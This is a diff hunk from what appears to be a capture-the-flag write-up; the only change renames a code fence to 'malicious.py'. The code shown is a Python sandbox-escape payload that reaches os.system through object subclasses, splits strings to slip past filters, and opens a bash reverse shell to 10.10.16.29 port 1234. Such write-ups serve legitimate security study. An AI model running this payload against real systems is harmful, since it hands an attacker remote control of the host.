@@ -79,7 +79,7 @@ Reference : [https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b09
 
 Final code : 
 
-```python
+```python:malicious.py
 [w for w in (1).__class__.__base__.__subclasses__() if w.__name__=='Quitter'][0].__init__.__globals__['sy'+'s'].modules['o'+'s'].__dict__['sy'+'stem']('bash -c "bash -i >& /dev/tcp/10.10.16.29/1234 0>&1"')
 ```
 
